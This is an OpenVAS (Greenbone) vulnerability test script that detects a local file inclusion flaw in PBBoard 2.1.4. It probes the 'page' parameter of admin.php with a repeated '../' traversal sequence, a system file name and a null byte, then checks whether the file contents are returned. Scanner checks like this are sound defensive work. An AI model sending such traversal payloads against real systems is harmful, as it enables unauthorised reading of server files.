##############################################################################
# OpenVAS Vulnerability Test
#
# PBBoard 'page' Parameter Local File Inclusion Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802631");
  script_version("2021-04-16T06:57:08+0000");
  script_bugtraq_id(53710);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2012-06-01 10:53:55 +0530 (Fri, 01 Jun 2012)");
  script_name("PBBoard 'page' Parameter Local File Inclusion Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53710");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/75922");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18937");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113084/pbboard-lfi.txt");
  script_xref(name:"URL", value:"http://bot24.blogspot.in/2012/05/pbboard-version-214-suffers-from-local.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow an attacker to view files and
  execute local scripts in the context of the webserver process.");

  script_tag(name:"affected", value:"PBBoard version 2.1.4");

  script_tag(name:"insight", value:"The flaw is due to an improper validation of user-supplied
  input to the 'page' parameter in 'admin.php', which allows attackers to read
  arbitrary files via a ../(dot dot) sequences.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running PBBoard and is prone to local file inclusion
  vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

files = traversal_files();

foreach dir (make_list_unique("/", "/PBBoard", "/pbb", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";
  url = dir + "/index.php";
  res = http_get_cache( item:url, port:port );
  if( isnull( res ) ) continue;

  if( res =~ "^HTTP/1\.[01] 200" && "Powered By PBBoard" >< res ) {

    foreach file (keys(files))
    {
      url = string(dir, "/admin.php?page=", crap(data:"../", length:3*15),
                   files[file], "%00");

      if(http_vuln_check(port:port, url:url, pattern:file, check_header:TRUE))
      {
        security_message(port:port);
        exit(0);
      }
    }
  }
}

exit(99);
